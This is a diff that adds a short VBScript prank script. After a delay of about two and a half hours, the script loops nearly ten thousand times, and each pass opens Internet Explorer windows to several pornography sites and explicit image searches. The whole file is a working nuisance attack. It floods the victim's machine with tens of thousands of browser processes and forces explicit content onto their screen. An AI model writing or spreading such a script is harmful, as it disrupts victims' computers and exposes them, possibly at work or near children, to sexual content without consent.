@@ -1,0 +1,10 @@
+Set wshShell = wscript.CreateObject("WScript.Shell")
+wscript.sleep 9540023
+For i = 0 To 9784
+WshShell.Run "iexplore.exe www.youjizz.com", 9
+WshShell.Run "iexplore.exe www.pornhub.com", 9
+WshShell.Run "iexplore.exe www.redtube.com", 9
+WshShell.Run "iexplore.exe big tits images", 9
+WshShell.Run "iexplore.exe porn xxx", 9
+WshShell.Run "iexplore.exe big penis images", 9
+Next
